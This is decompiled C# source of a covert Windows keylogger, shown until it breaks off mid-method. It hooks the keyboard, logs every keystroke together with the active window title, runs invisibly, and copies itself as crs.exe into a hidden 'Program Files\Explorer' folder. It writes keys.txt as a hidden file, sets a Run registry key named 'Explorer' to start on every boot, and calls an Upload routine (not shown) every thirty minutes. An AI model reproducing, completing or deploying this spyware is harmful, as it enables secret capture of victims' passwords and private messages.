using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using Microsoft.Win32;
using My;

public class mainfrm : Form
{
	public struct KBDLLHOOKSTRUCT
	{
		public int vkCode;

		public int scanCode;

		public int flags;

		public int time;

		public int dwExtraInfo;
	}

	public enum virtualKey
	{
		K_Return = 13,
		K_Backspace = 8,
		K_Space = 32,
		K_Tab = 9,
		K_Esc = 27,
		K_Control = 17,
		K_LControl = 162,
		K_RControl = 163,
		K_Delete = 46,
		K_End = 35,
		K_Home = 36,
		K_Insert = 45,
		K_Shift = 16,
		K_LShift = 160,
		K_RShift = 161,
		K_Pause = 19,
		K_PrintScreen = 44,
		K_LWin = 91,
		K_RWin = 92,
		K_Alt = 18,
		K_LAlt = 164,
		K_RAlt = 165,
		K_NumLock = 144,
		K_CapsLock = 20,
		K_Up = 38,
		K_Down = 40,
		K_Right = 39,
		K_Left = 37,
		K_F1 = 112,
		K_F2 = 113,
		K_F3 = 114,
		K_F4 = 115,
		K_F5 = 116,
		K_F6 = 117,
		K_F7 = 118,
		K_F8 = 119,
		K_F9 = 120,
		K_F10 = 121,
		K_F11 = 122,
		K_F12 = 123,
		K_F13 = 124,
		K_F14 = 125,
		K_F15 = 126,
		K_F16 = 127,
		K_F17 = 128,
		K_F18 = 129,
		K_F19 = 130,
		K_F20 = 131,
		K_F21 = 132,
		K_F22 = 133,
		K_F23 = 134,
		K_F24 = 135,
		K_Numpad0 = 96,
		K_Numpad1 = 97,
		K_Numpad2 = 98,
		K_Numpad3 = 99,
		K_Numpad4 = 100,
		K_Numpad5 = 101,
		K_Numpad6 = 102,
		K_Numpad7 = 103,
		K_Numpad8 = 104,
		K_Numpad9 = 105,
		K_Num_Add = 107,
		K_Num_Divide = 111,
		K_Num_Multiply = 106,
		K_Num_Subtract = 109,
		K_Num_Decimal = 110,
		K_0 = 48,
		K_1 = 49,
		K_2 = 50,
		K_3 = 51,
		K_4 = 52,
		K_5 = 53,
		K_6 = 54,
		K_7 = 55,
		K_8 = 56,
		K_9 = 57,
		K_A = 65,
		K_B = 66,
		K_C = 67,
		K_D = 68,
		K_E = 69,
		K_F = 70,
		K_G = 71,
		K_H = 72,
		K_I = 73,
		K_J = 74,
		K_K = 75,
		K_L = 76,
		K_M = 77,
		K_N = 78,
		K_O = 79,
		K_P = 80,
		K_Q = 81,
		K_R = 82,
		K_S = 83,
		K_T = 84,
		K_U = 85,
		K_V = 86,
		K_W = 87,
		K_X = 88,
		K_Y = 89,
		K_Z = 90,
		K_Subtract = 189,
		K_Decimal = 190,
		K_Comma = 188,
		K_Slash = 191,
		K_Dotcomma = 186,
		K_Girshaim1 = 222,
		K_BackSlash = 220,
		K_QScobaLEFT = 219,
		K_QScobaRIGHT = 221,
		K_req = 192,
		K_equal = 187,
		K_backslash2 = 226,
		K_end2 = 35,
		K_PD = 34,
		K_PU = 33,
		K_Home2 = 36,
		K_Insert2 = 45,
		K_scrol = 145,
		K_Pause2 = 19,
		K_num = 144,
		K_slash2 = 111,
		K_star = 106,
		K_plus = 107,
		K_i0 = 96,
		K_i1 = 97,
		K_i2 = 98,
		K_i3 = 99,
		K_i4 = 100,
		K_i5 = 101,
		K_i6 = 102,
		K_i7 = 103,
		K_i8 = 104,
		K_i9 = 105,
		K_Lwindows = 91,
		K_RWindows = 92,
		K_menu = 93
	}

	private delegate int KeyboardHookDelegate(int Code, int wParam, ref KBDLLHOOKSTRUCT lParam);

	public struct RECT
	{
		public int left;

		public int top;

		public int right;

		public int bottom;
	}

	public struct APPBARDATA
	{
		public int cbSize;

		public IntPtr hWnd;

		public int uCallbackMessage;

		public ABEdge uEdge;

		public RECT rc;

		public IntPtr lParam;
	}

	public enum ABMsg
	{
		ABM_NEW,
		ABM_REMOVE,
		ABM_QUERYPOS,
		ABM_SETPOS,
		ABM_GETSTATE,
		ABM_GETTASKBARPOS,
		ABM_ACTIVATE,
		ABM_GETAUTOHIDEBAR,
		ABM_SETAUTOHIDEBAR,
		ABM_WINDOWPOSCHANGED,
		ABM_SETSTATE
	}

	public enum ABNotify
	{
		ABN_STATECHANGE,
		ABN_POSCHANGED,
		ABN_FULLSCREENAPP,
		ABN_WINDOWARRANGE
	}

	public enum ABEdge
	{
		ABE_LEFT,
		ABE_TOP,
		ABE_RIGHT,
		ABE_BOTTOM
	}

	private IContainer components;

	[AccessedThroughProperty("btnStop")]
	private Button _btnStop;

	[AccessedThroughProperty("btnExit")]
	private Button _btnExit;

	[AccessedThroughProperty("Timer1")]
	private Timer _Timer1;

	[AccessedThroughProperty("btnStart")]
	private Button _btnStart;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("n")]
	private NotifyIcon _n;

	[AccessedThroughProperty("Button1")]
	private Button _Button1;

	[AccessedThroughProperty("Timer2")]
	private Timer _Timer2;

	[AccessedThroughProperty("Button2")]
	private Button _Button2;

	[AccessedThroughProperty("deleteall")]
	private Button _deleteall;

	private const int WM_KEYUP = 257;

	private const short WM_KEYDOWN = 256;

	private const int WM_SYSKEYDOWN = 260;

	private const int WM_SYSKEYUP = 261;

	private IntPtr KeyboardHandle;

	private string LastCheckedForegroundTitle;

	private KeyboardHookDelegate callback;

	private string KeyLog;

	private const int ABM_GETTASKBARPOS = 5;

	private const int WM_SYSCOMMAND = 274;

	private const int SC_MINIMIZE = 61472;

	internal virtual Button btnStop
	{
		get
		{
			return _btnStop;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_btnStop != null)
			{
				((Control)_btnStop).remove_Click((EventHandler)btnStop_Click);
			}
			_btnStop = value;
			if (_btnStop != null)
			{
				((Control)_btnStop).add_Click((EventHandler)btnStop_Click);
			}
		}
	}

	internal virtual Button btnExit
	{
		get
		{
			return _btnExit;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_btnExit != null)
			{
				((Control)_btnExit).remove_Click((EventHandler)btnExit_Click);
			}
			_btnExit = value;
			if (_btnExit != null)
			{
				((Control)_btnExit).add_Click((EventHandler)btnExit_Click);
			}
		}
	}

	internal virtual Timer Timer1
	{
		get
		{
			return _Timer1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Timer1 != null)
			{
				_Timer1.remove_Tick((EventHandler)Timer1_Tick);
			}
			_Timer1 = value;
			if (_Timer1 != null)
			{
				_Timer1.add_Tick((EventHandler)Timer1_Tick);
			}
		}
	}

	internal virtual Button btnStart
	{
		get
		{
			return _btnStart;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_btnStart != null)
			{
				((Control)_btnStart).remove_Click((EventHandler)btnStart_Click);
			}
			_btnStart = value;
			if (_btnStart != null)
			{
				((Control)_btnStart).add_Click((EventHandler)btnStart_Click);
			}
		}
	}

	internal virtual Label Label1
	{
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual NotifyIcon n
	{
		get
		{
			return _n;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_n != null)
			{
				_n.remove_DoubleClick((EventHandler)Notify_DoubleClick);
			}
			_n = value;
			if (_n != null)
			{
				_n.add_DoubleClick((EventHandler)Notify_DoubleClick);
			}
		}
	}

	internal virtual Button Button1
	{
		get
		{
			return _Button1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Button1 != null)
			{
				((Control)_Button1).remove_Click((EventHandler)Button1_Click);
			}
			_Button1 = value;
			if (_Button1 != null)
			{
				((Control)_Button1).add_Click((EventHandler)Button1_Click);
			}
		}
	}

	internal virtual Timer Timer2
	{
		get
		{
			return _Timer2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Timer2 != null)
			{
				_Timer2.remove_Tick((EventHandler)Timer2_Tick);
			}
			_Timer2 = value;
			if (_Timer2 != null)
			{
				_Timer2.add_Tick((EventHandler)Timer2_Tick);
			}
		}
	}

	internal virtual Button Button2
	{
		get
		{
			return _Button2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_Button2 != null)
			{
				((Control)_Button2).remove_Click((EventHandler)Button2_Click);
			}
			_Button2 = value;
			if (_Button2 != null)
			{
				((Control)_Button2).add_Click((EventHandler)Button2_Click);
			}
		}
	}

	internal virtual Button deleteall
	{
		get
		{
			return _deleteall;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		set
		{
			if (_deleteall != null)
			{
				((Control)_deleteall).remove_Click((EventHandler)deleteall_Click);
			}
			_deleteall = value;
			if (_deleteall != null)
			{
				((Control)_deleteall).add_Click((EventHandler)deleteall_Click);
			}
		}
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)new mainfrm());
	}

	public mainfrm()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		((Form)this).add_Load((EventHandler)frm_Load);
		((Form)this).add_FormClosing(new FormClosingEventHandler(Form1_FormClosing));
		KeyboardHandle = (IntPtr)0;
		LastCheckedForegroundTitle = "";
		callback = null;
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_004f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0059: Expected O, but got Unknown
		//IL_005a: Unknown result type (might be due to invalid IL or missing references)
		//IL_0064: Expected O, but got Unknown
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0075: Expected O, but got Unknown
		//IL_0076: Unknown result type (might be due to invalid IL or missing references)
		//IL_0080: Expected O, but got Unknown
		//IL_0081: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		//IL_0201: Unknown result type (might be due to invalid IL or missing references)
		//IL_020b: Expected O, but got Unknown
		components = new Container();
		btnStop = new Button();
		btnExit = new Button();
		Timer1 = new Timer(components);
		btnStart = new Button();
		Label1 = new Label();
		n = new NotifyIcon(components);
		Button1 = new Button();
		Timer2 = new Timer(components);
		Button2 = new Button();
		deleteall = new Button();
		((Control)this).SuspendLayout();
		((Control)btnStop).set_Enabled(false);
		Button obj = btnStop;
		Point location = new Point(196, 44);
		((Control)obj).set_Location(location);
		((Control)btnStop).set_Name("btnStop");
		Button obj2 = btnStop;
		Size size = new Size(75, 23);
		((Control)obj2).set_Size(size);
		((Control)btnStop).set_TabIndex(1);
		((ButtonBase)btnStop).set_Text("Stop");
		((ButtonBase)btnStop).set_UseVisualStyleBackColor(true);
		Button obj3 = btnExit;
		location = new Point(91, 44);
		((Control)obj3).set_Location(location);
		((Control)btnExit).set_Name("btnExit");
		Button obj4 = btnExit;
		size = new Size(96, 23);
		((Control)obj4).set_Size(size);
		((Control)btnExit).set_TabIndex(2);
		((ButtonBase)btnExit).set_Text("Exit");
		((ButtonBase)btnExit).set_UseVisualStyleBackColor(true);
		Timer1.set_Enabled(true);
		Timer1.set_Interval(30000);
		Button obj5 = btnStart;
		location = new Point(10, 44);
		((Control)obj5).set_Location(location);
		((Control)btnStart).set_Name("btnStart");
		Button obj6 = btnStart;
		size = new Size(75, 23);
		((Control)obj6).set_Size(size);
		((Control)btnStart).set_TabIndex(3);
		((ButtonBase)btnStart).set_Text("Start");
		((ButtonBase)btnStart).set_UseVisualStyleBackColor(true);
		((Control)Label1).set_Font(new Font("Microsoft Sans Serif", 12f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)Label1).set_ForeColor(Color.DarkRed);
		Label label = Label1;
		location = new Point(12, 9);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(259, 33);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(4);
		Label1.set_Text("Not Active");
		Label1.set_TextAlign((ContentAlignment)32);
		n.set_Text(".");
		n.set_Visible(true);
		Button button = Button1;
		location = new Point(196, 94);
		((Control)button).set_Location(location);
		((Control)Button1).set_Name("Button1");
		Button button2 = Button1;
		size = new Size(77, 23);
		((Control)button2).set_Size(size);
		((Control)Button1).set_TabIndex(5);
		((ButtonBase)Button1).set_Text("Hide");
		((ButtonBase)Button1).set_UseVisualStyleBackColor(true);
		Timer2.set_Enabled(true);
		Timer2.set_Interval(1800000);
		Button button3 = Button2;
		location = new Point(10, 94);
		((Control)button3).set_Location(location);
		((Control)Button2).set_Name("Button2");
		Button button4 = Button2;
		size = new Size(75, 23);
		((Control)button4).set_Size(size);
		((Control)Button2).set_TabIndex(6);
		((ButtonBase)Button2).set_Text("Write to file");
		((ButtonBase)Button2).set_UseVisualStyleBackColor(true);
		Button obj7 = deleteall;
		location = new Point(94, 74);
		((Control)obj7).set_Location(location);
		((Control)deleteall).set_Name("deleteall");
		Button obj8 = deleteall;
		size = new Size(93, 43);
		((Control)obj8).set_Size(size);
		((Control)deleteall).set_TabIndex(7);
		((ButtonBase)deleteall).set_Text("Delete All Settings...");
		((ButtonBase)deleteall).set_UseVisualStyleBackColor(true);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(285, 129);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)deleteall);
		((Control)this).get_Controls().Add((Control)(object)Button2);
		((Control)this).get_Controls().Add((Control)(object)Button1);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)btnStart);
		((Control)this).get_Controls().Add((Control)(object)btnExit);
		((Control)this).get_Controls().Add((Control)(object)btnStop);
		((Form)this).set_MaximizeBox(false);
		((Control)this).set_Name("frm");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int UnhookWindowsHookEx(int hHook);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int SetWindowsHookExA(int idHook, KeyboardHookDelegate lpfn, int hmod, int dwThreadId);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetAsyncKeyState(int vKey);

	[DllImport("user32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int CallNextHookEx(int hHook, int nCode, int wParam, KBDLLHOOKSTRUCT lParam);

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetForegroundWindow();

	[DllImport("user32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetWindowTextA(int hwnd, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpString, int cch);

	private string GetActiveWindowTitle()
	{
		string lpString = new string('\0', 100);
		GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
		return lpString.Substring(0, checked(Strings.InStr(lpString, "\0", (CompareMethod)0) - 1));
	}

	private object Hooked()
	{
		return KeyboardHandle != (IntPtr)0;
	}

	public void HookKeyboard()
	{
		callback = KeyboardCallback;
		KeyboardHandle = (IntPtr)SetWindowsHookExA(13, callback, (int)Process.GetCurrentProcess().MainModule!.BaseAddress, 0);
		if (KeyboardHandle != (IntPtr)0)
		{
			((Control)btnStop).set_Enabled(true);
			((Control)btnStart).set_Enabled(false);
			Label1.set_Text("Active");
			((Control)Label1).set_ForeColor(Color.DarkGreen);
		}
	}

	public void UnhookKeyboard()
	{
		if (Conversions.ToBoolean(Hooked()) && UnhookWindowsHookEx((int)KeyboardHandle) != 0)
		{
			Label1.set_Text("Not Active");
			((Control)Label1).set_ForeColor(Color.DarkRed);
			((Control)btnStop).set_Enabled(false);
			((Control)btnStart).set_Enabled(true);
			KeyboardHandle = (IntPtr)0;
		}
	}

	public int KeyboardCallback(int Code, int wParam, ref KBDLLHOOKSTRUCT lParam)
	{
		string activeWindowTitle = GetActiveWindowTitle();
		if (Operators.CompareString(activeWindowTitle, LastCheckedForegroundTitle, false) != 0)
		{
			LastCheckedForegroundTitle = activeWindowTitle;
			KeyLog = KeyLog + "\r\n----------- " + activeWindowTitle + " (" + DateAndTime.get_Now().ToString() + ") ------------\r\n";
		}
		string text = "";
		if (wParam == 256 || wParam == 260)
		{
			if (Code >= 0 && (((Computer)MyProject.Computer).get_Keyboard().get_CtrlKeyDown() & ((Computer)MyProject.Computer).get_Keyboard().get_AltKeyDown() & (lParam.vkCode == 83)))
			{
				((Control)this).set_Visible(true);
				((Form)this).set_Opacity(100.0);
				((Form)this).set_WindowState((FormWindowState)0);
				n.set_Visible(false);
				((Control)this).Show();
				AnimateWindow(ToTray: false);
				((Form)this).set_ShowInTaskbar(true);
				return 1;
			}
			checked
			{
				switch (lParam.vkCode)
				{
				case 8:
					text = "[BSpace]";
					break;
				case 9:
					text = " [TAB]";
					break;
				case 13:
					text = "\r\n";
					break;
				case 19:
					text = "[Pause]";
					break;
				case 20:
					text = ((!((Computer)MyProject.Computer).get_Keyboard().get_CapsLock()) ? "[CAPS]" : "[/CAPS]");
					break;
				case 27:
					text = "[ESC]";
					break;
				case 32:
					text = " ";
					break;
				case 33:
					text = "[PageDown]";
					break;
				case 34:
					text = "[PageUp]";
					break;
				case 35:
					text = "[END]";
					break;
				case 36:
					text = "[Home]";
					break;
				case 37:
					text = "[LArrow]";
					break;
				case 38:
					text = "[UArrow]";
					break;
				case 39:
					text = "[RArrow]";
					break;
				case 40:
					text = "[DArrow]";
					break;
				case 45:
					text = "[Insert]";
					break;
				case 46:
					text = "[DEL]";
					break;
				case 48:
				case 49:
				case 50:
				case 51:
				case 52:
				case 53:
				case 54:
				case 55:
				case 56:
				case 57:
					text = Conversions.ToString(Strings.ChrW(lParam.vkCode));
					break;
				case 65:
				case 66:
				case 67:
				case 68:
				case 69:
				case 70:
				case 71:
				case 72:
				case 73:
				case 74:
				case 75:
				case 76:
				case 77:
				case 78:
				case 79:
				case 80:
				case 81:
				case 82:
				case 83:
				case 84:
				case 85:
				case 86:
				case 87:
				case 88:
				case 89:
				case 90:
					text = Conversions.ToString(Strings.ChrW(lParam.vkCode + 32));
					break;
				case 91:
					text = "[LWindows]";
					break;
				case 92:
					text = "[RWindows]";
					break;
				case 93:
					text = "[MENU]";
					break;
				case 96:
					text = "0";
					break;
				case 97:
					text = "1";
					break;
				case 98:
					text = "2";
					break;
				case 99:
					text = "3";
					break;
				case 100:
					text = "4";
					break;
				case 101:
					text = "5";
					break;
				case 102:
					text = "6";
					break;
				case 103:
					text = "7";
					break;
				case 104:
					text = "8";
					break;
				case 105:
					text = "9";
					break;
				case 106:
					text = "*";
					break;
				case 107:
					text = "+";
					break;
				case 111:
					text = "/";
					break;
				case 112:
				case 113:
				case 114:
				case 115:
				case 116:
				case 117:
				case 118:
				case 119:
				case 120:
				case 121:
				case 122:
				case 123:
				case 124:
				case 125:
				case 126:
				case 127:
				case 128:
				case 129:
				case 130:
				case 131:
				case 132:
				case 133:
				case 134:
				case 135:
					text = "[F" + Conversions.ToString(lParam.vkCode - 111) + "]";
					break;
				case 144:
					text = "[NumLock]";
					break;
				case 145:
					text = "[ScrLk]";
					break;
				case 160:
				case 161:
					if (!KeyLog.EndsWith("[SHFT]"))
					{
						text = "[SHFT]";
					}
					break;
				case 162:
				case 163:
					if (!KeyLog.EndsWith("[CTRL]"))
					{
						text = "[CTRL]";
					}
					break;
				case 164:
					if (!KeyLog.EndsWith("[ALT]"))
					{
						text = "[ALT]";
					}
					break;
				case 165:
					if (!KeyLog.EndsWith("[RALT]"))
					{
						text = "[RALT]";
					}
					break;
				case 186:
					text = ";";
					break;
				case 187:
					text = "=";
					break;
				case 188:
					text = ",";
					break;
				case 109:
				case 189:
					text = "-";
					break;
				case 110:
				case 190:
					text = ".";
					break;
				case 191:
					text = "/";
					break;
				case 192:
					text = "`";
					break;
				case 219:
					text = "[";
					break;
				case 220:
					text = "\\";
					break;
				case 221:
					text = "]";
					break;
				case 222:
					text = "'";
					break;
				default:
					text = Conversions.ToString(lParam.vkCode);
					break;
				case 226:
					text = "\\";
					break;
				}
			}
		}
		else if (wParam == 257 || wParam == 261)
		{
			switch (lParam.vkCode)
			{
			case 160:
			case 161:
				text = "[/SHFT]";
				break;
			case 162:
			case 163:
				text = "[/CTRL]";
				break;
			case 164:
				text = "[/ALT]";
				break;
			case 165:
				text = "[/ALT GR]";
				break;
			}
		}
		KeyLog += text;
		return CallNextHookEx((int)KeyboardHandle, Code, wParam, lParam);
	}

	private void Button1_Click(object sender, EventArgs e)
	{
		((Form)this).set_WindowState((FormWindowState)1);
		((Form)this).set_ShowInTaskbar(false);
		AnimateWindow(ToTray: true);
	}

	private void btnStart_Click(object sender, EventArgs e)
	{
		Timer1.Start();
		HookKeyboard();
	}

	private void btnStop_Click(object sender, EventArgs e)
	{
		Timer1.Stop();
		UnhookKeyboard();
	}

	private void btnExit_Click(object sender, EventArgs e)
	{
		Timer1.Stop();
		((Form)this).Close();
	}

	private void Form1_FormClosing(object sender, FormClosingEventArgs e)
	{
		UnhookKeyboard();
	}

	[DllImport("shell32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	public static extern int SHAppBarMessage(int dwMessage, ref APPBARDATA pData);

	protected override void WndProc(ref Message m)
	{
		if (((Message)(ref m)).get_Msg() == 274 && ((Message)(ref m)).get_WParam().ToInt32() == 61472)
		{
			AnimateWindow(ToTray: true);
		}
		else
		{
			((Form)this).WndProc(ref m);
		}
	}

	private void Notify_DoubleClick(object sender, EventArgs e)
	{
		AnimateWindow(ToTray: false);
	}

	private void AnimateWindow(bool ToTray)
	{
		if (ToTray)
		{
			((Control)this).Hide();
			n.set_Visible(true);
		}
		else
		{
			n.set_Visible(false);
			((Control)this).Show();
		}
	}

	public bool IsProcessOpen(string name)
	{
		Process[] processes = Process.GetProcesses();
		int num = 0;
		while (true)
		{
			if (num < processes.Length)
			{
				Process process = processes[num];
				if (process.ProcessName.Contains(name))
				{
					break;
				}
				num = checked(num + 1);
				continue;
			}
			return false;
		}
		return true;
	}

	private void Timer2_Tick(object sender, EventArgs e)
	{
		try
		{
			Upload();
			Timer2.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Timer2.Start();
			ProjectData.ClearProjectError();
		}
	}

	private void Timer1_Tick(object sender, EventArgs e)
	{
		try
		{
			string text = null;
			text = Environment.GetEnvironmentVariable("ProgramFiles") + "\\Explorer\\";
			string text2 = text + "keys.txt";
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(text2, KeyLog, true);
			((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(text2).Attributes |= FileAttributes.Hidden;
			KeyLog = "\r\n";
			Timer1.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Timer1.Start();
			ProjectData.ClearProjectError();
		}
	}

	private void Button2_Click(object sender, EventArgs e)
	{
		try
		{
			string text = null;
			text = Environment.GetEnvironmentVariable("ProgramFiles") + "\\Explorer\\";
			string text2 = text + "keys.txt";
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllText(text2, KeyLog, true);
			((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(text2).Attributes |= FileAttributes.Hidden;
			KeyLog = null;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void frm_Load(object sender, EventArgs e)
	{
		//IL_0220: Unknown result type (might be due to invalid IL or missing references)
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		string text = default(string);
		Process[] processesByName = default(Process[]);
		string text2 = default(string);
		string sourceFileName = default(string);
		string text3 = default(string);
		FileInfo fileInfo = default(FileInfo);
		DirectoryInfo directoryInfo = default(DirectoryInfo);
		FileInfo fileInfo2 = default(FileInfo);
		RegistryKey registryKey = default(RegistryKey);
		RegistryKey registryKey2 = default(RegistryKey);
		int num5 = default(int);
		int interval = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0008;
				case 761:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0008;
						case 3:
							goto IL_0011;
						case 4:
							goto IL_0025;
						case 5:
							goto IL_002f;
						case 6:
							goto IL_0038;
						case 8:
							goto IL_0045;
						case 9:
							goto IL_0048;
						case 10:
							goto IL_004f;
						case 11:
							goto IL_0064;
						case 12:
							goto IL_007e;
						case 13:
							goto IL_008f;
						case 14:
							goto IL_009c;
						case 16:
							goto IL_00ab;
						case 17:
							goto IL_00af;
						case 18:
							goto IL_00bb;
						case 19:
							goto IL_00d1;
						case 22:
							goto IL_00e7;
						case 23:
							goto IL_00eb;
						case 24:
							goto IL_00f7;
						case 25:
							goto IL_010e;
						case 26:
							goto IL_0122;
						case 27:
							goto IL_012e;
						case 28:
							goto IL_0144;
						case 15:
						case 20:
						case 21:
						case 29:
						case 30:
							goto IL_0158;
						case 31:
							goto IL_016e;
						case 33:
							goto IL_0180;
						case 34:
							goto IL_0184;
						case 35:
							goto IL_019a;
						case 32:
						case 36:
						case 37:
							goto IL_01ab;
						case 38:
							goto IL_01b2;
						case 39:
							goto IL_01bf;
						case 40:
							goto IL_01d0;
						case 41:
							goto IL_01db;
						case 42:
							goto IL_01e6;
						case 43:
							goto IL_01f5;
						case 44:
							goto IL_0204;
						case 45:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 7:
						case 46:
						case 47:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_0204:
					num = 44;
					HookKeyboard();
					break;
					IL_0008:
					num = 2;
					text = "crs.exe";
					goto IL_0011;
					IL_0011:
					num = 3;
					text = text.Replace(".exe", "");
					goto IL_0025;
					IL_0025:
					num = 4;
					processesByName = Process.GetProcessesByName(text);
					goto IL_002f;
					IL_002f:
					num = 5;
					if (processesByName.Length > 1)
					{
						goto IL_0038;
					}
					goto IL_0045;
					IL_0038:
					num = 6;
					Application.Exit();
					goto end_IL_0000_3;
					IL_0045:
					num = 8;
					goto IL_0048;
					IL_0048:
					num = 9;
					text2 = null;
					goto IL_004f;
					IL_004f:
					num = 10;
					sourceFileName = Application.get_StartupPath() + "\\crs.exe";
					goto IL_0064;
					IL_0064:
					num = 11;
					text2 = Environment.GetEnvironmentVariable("ProgramFiles") + "\\Explorer\\";
					goto IL_007e;
					IL_007e:
					num = 12;
					text3 = text2 + "crs.exe";
					goto IL_008f;
					IL_008f:
					num = 13;
					if (Directory.Exists(text2))
					{
						goto IL_009c;
					}
					goto IL_00e7;
					IL_009c:
					num = 14;
					if (!File.Exists(text3))
					{
						goto IL_00ab;
					}
					goto IL_0158;
					IL_00ab:
					num = 16;
					goto IL_00af;
					IL_00af:
					num = 17;
					File.Copy(sourceFileName, text3);
					goto IL_00bb;
					IL_00bb:
					num = 18;
					fileInfo = ((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(text3);
					goto IL_00d1;
					IL_00d1:
					num = 19;
					fileInfo.Attributes |= FileAttributes.Hidden;
					goto IL_0158;
					IL_00e7:
					num = 22;
					goto IL_00eb;
					IL_00eb:
					num = 23;
					Directory.CreateDirectory(text2);
					goto IL_00f7;
					IL_00f7:
					num = 24;
					directoryInfo = ((ServerComputer)MyProject.Computer).get_FileSystem().GetDirectoryInfo(text2);
					goto IL_010e;
					IL_010e:
					num = 25;
					directoryInfo.Attributes |= FileAttributes.Hidden;
					goto IL_0122;
					IL_0122:
					num = 26;
					File.Copy(sourceFileName, text3);
					goto IL_012e;
					IL_012e:
					num = 27;
					fileInfo2 = ((ServerComputer)MyProject.Computer).get_FileSystem().GetFileInfo(text3);
					goto IL_0144;
					IL_0144:
					num = 28;
					fileInfo2.Attributes |= FileAttributes.Hidden;
					goto IL_0158;
					IL_0158:
					num = 30;
					registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					goto IL_016e;
					IL_016e:
					num = 31;
					if (registryKey.GetValue("Explorer") == null)
					{
						goto IL_0180;
					}
					goto IL_01ab;
					IL_0180:
					num = 33;
					goto IL_0184;
					IL_0184:
					num = 34;
					registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
					goto IL_019a;
					IL_019a:
					num = 35;
					registryKey2.SetValue("Explorer", text3);
					goto IL_01ab;
					IL_01ab:
					num = 37;
					num5 = 30;
					goto IL_01b2;
